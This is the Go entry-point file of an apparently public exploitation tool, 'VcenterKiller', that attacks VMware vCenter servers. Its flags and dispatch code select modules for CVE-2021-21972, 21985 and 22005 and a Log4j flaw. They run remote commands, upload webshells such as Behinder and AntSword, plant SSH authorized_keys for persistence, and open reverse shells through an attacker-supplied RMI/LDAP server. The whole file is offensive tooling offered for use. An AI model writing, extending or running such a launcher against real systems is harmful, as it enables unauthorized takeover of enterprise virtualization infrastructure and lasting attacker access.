package main

import (
	"GO_VCENTER/src/c_21972"
	"GO_VCENTER/src/c_21985"
	"GO_VCENTER/src/c_22005"
	"GO_VCENTER/src/log4jcenter"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
)

var (
	h        bool
	url      string
	filename string
	cve      string
	command  string
	proxy    string
	exp_type string
	rmi      string
)

func usage() {
	fmt.Println(`Usage of main.exe:
	-u url
		  you target, example: https://192.168.1.1
	-m module
		  you selected cve code, example: 21972 or 22205 or 21985 or log4center
	-c command
		  you want execute command, example: "whoami"
	-f filename
		  to upload webshell, expamle: behinder.jsp or antsword.jsp or gozllia.jsp 
	-t attack mode
		  your attack mode, example: use "ssh" to get ssh shell, not webshell, use -r rmi://xx/xx to get reverseshell
	-r rmi server
		  your ldap & rmi server`)
}

func banner() {
	ban := `
			__     __             _              _  ___ _ _
			\ \   / /__ ___ _ __ | |_ ___ _ __  | |/ (_) | | ___ _ __
			 \ \ / / __/ _ \ '_ \| __/ _ \ '__| | ' /| | | |/ _ \ '__|
	  		  \ V / (_|  __/ | | | ||  __/ |    | . \| | | |  __/ |
	   		   \_/ \___\___|_| |_|\__\___|_|    |_|\_\_|_|_|\___|_|       by schira4396
			   `
	fmt.Println(ban)
}

func main() {
	flag.StringVar(&url, "u", "", "your target")
	flag.StringVar(&filename, "f", "", "filename")
	flag.StringVar(&cve, "m", "", "select cve")
	flag.StringVar(&command, "c", "", "command")
	flag.StringVar(&exp_type, "t", "", "CVE-2021-21972 Module")
	flag.StringVar(&rmi, "r", "", "rmi server address")
	flag.Usage = usage
	flag.Parse()
	banner()
	if len(os.Args) == 1 {
		usage()
		os.Exit(0)
	}
	fmt.Println("[*] url: " + url)
	switch cve {
	case "22205":
		{
			c_22005.Test(url, filename)
		}
	case "21985":
		{
			if exp_type == "rshell" {
				c_21985.Exploit(url, rmi)
			} else if exp_type == "" {
				c_21985.Attack(url, command)
			} else {
				fmt.Println("\"" + exp_type + "\"" + " is an incorrect parameter.")
			}

		}
	case "21972":
		{
			t, err := ioutil.ReadFile(filename)
			_ = err
			fmt.Println(string(t))
			if exp_type == "ssh" {
				c_21972.Upload_ssh_authorized_keys(url, string(t))
			} else if exp_type == "" {
				c_21972.Upload_windows_shell(url, string(t))
				c_21972.Upload_linux_shell(url, string(t))
			} else {
				fmt.Println("\"" + exp_type + "\"" + " is an incorrect parameter.")
			}
		}
	case "log4center":
		{
			if exp_type == "scan" {

				log4jcenter.StartScan(url)
			} else if exp_type == "rshell" {
				if rmi != "" {
					log4jcenter.StartExploit(url, rmi)
				} else {
					usage()
				}

			} else {
				fmt.Println("\"" + exp_type + "\"" + " is an incorrect parameter.")
			}

		}
	}

}
